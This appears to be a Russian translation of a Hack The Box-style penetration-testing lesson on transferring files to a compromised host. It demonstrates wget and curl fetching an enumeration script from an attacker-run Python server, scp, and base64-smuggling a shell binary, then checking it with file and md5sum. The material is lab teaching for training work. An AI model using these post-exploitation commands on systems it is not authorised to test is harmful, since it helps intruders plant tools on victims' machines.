# Transferring Files

Во время любого упражнения по тестированию на проникновение вполне вероятно, что нам потребуется передать файлы на удаленный сервер, такие как скрипты перечисления или эксплойты, или передать данные обратно на наш атакующий узел. Хотя такие инструменты, как Metasploit с оболочкой Meterpreter, позволяют нам использовать команду «`Upload`» для загрузки файла, нам необходимо изучить методы передачи файлов с помощью стандартной обратной оболочки.

## Using wget

Для этого есть много способов. Один из методов - запуск [HTTP-сервера Python](https://developer.mozilla.org/en-US/docs/Learn/Common_questions/set_up_a_local_testing_server) на нашем компьютере, а затем использование wget или cURL для загрузки файла на удаленный хост. Сначала мы переходим в каталог, содержащий файл, который нам нужен для передачи, и запускаем в нем HTTP-сервер Python:

```text
spike@htb[/htb]$ cd /tmp
spike@htb[/htb]$ python3 -m http.server 8000

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Теперь, когда мы настроили слушающий сервер на нашей машине, мы можем загрузить файл на удаленный хост, на котором у нас выполняется код:

```text
user@remotehost$ wget http://10.10.14.1:8000/linenum.sh

...SNIP...
Saving to: 'linenum.sh'

linenum.sh 100%[==============================================>] 144.86K  --.-KB/s    in 0.02s

2021-02-08 18:09:19 (8.16 MB/s) - 'linenum.sh' saved [14337/14337]
```

Обратите внимание, что мы использовали наш IP 10.10.14.1 и порт, на котором работает наш сервер Python на 8000. Если на удаленном сервере нет wget, мы можем использовать cURL для загрузки файла:

```text
user@remotehost$ curl http://10.10.14.1:8000/linenum.sh -o linenum.sh

100  144k  100  144k    0     0  176k      0 --:--:-- --:--:-- --:--:-- 176k
```

Обратите внимание, что мы использовали флаг -o, чтобы указать имя выходного файла.

## Using SCP

Другой метод передачи файлов - использование scp, если мы получили учетные данные пользователя ssh на удаленном хосте. Сделать это можно следующим образом:

```text
spike@htb[/htb]$ scp linenum.sh user@remotehost:/tmp/linenum.sh

user@remotehost's password: *********
linenum.sh
```

Обратите внимание, что мы указали имя локального файла после scp, а удаленный каталог будет сохранен после `:`.

## Using Base64

В некоторых случаях мы не сможем передать файл. Например, удаленный хост может иметь защиту брандмауэра, которая не позволяет нам загрузить файл с нашей машины. В такой ситуации мы можем использовать простой трюк для кодирования файла [base64](https://linux.die.net/man/1/base64) в формат [base64](https://linux.die.net/man/1/base64), а затем мы можем вставить строку [base64](https://linux.die.net/man/1/base64) на удаленный сервер и декодировать ее. Например, если мы хотим передать двоичный файл с именем shell, мы можем кодировать его в base64 следующим образом:

```bash
spike@htb[/htb]$ base64 shell -w 0

f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA...SNIO...lIuy9iaW4vc2gAU0iJ51JXSInmDwU
```

Теперь мы можем скопировать эту строку base64, перейти на удаленный хост, использовать base64 -d для ее декодирования и передать вывод в файл:

```bash
user@remotehost$ echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA...SNIO...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
```

## Validating File Transfers

Чтобы проверить формат файла, мы можем запустить для него команду [file](https://linux.die.net/man/1/file):

```bash
user@remotehost$ file shell
shell: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header
```

Как мы видим, когда мы запускаем команду file для файла оболочки, она говорит, что это двоичный файл ELF, что означает, что мы успешно его передали. Чтобы убедиться, что мы не испортили файл во время процесса кодирования / декодирования, мы можем проверить его хеш md5. На нашей машине мы можем запустить md5sum:

```bash
spike@htb[/htb]$ md5sum shell

321de1d7e7c3735838890a72c9ae7d1d shell
```

Теперь мы можем перейти на удаленный сервер и выполнить ту же команду для переданного файла:

```bash
user@remotehost$ md5sum shell

321de1d7e7c3735838890a72c9ae7d1d shell
```

Как мы видим, оба файла имеют одинаковый хэш md5, что означает, что файл был передан правильно. Существуют различные другие методы передачи файлов.

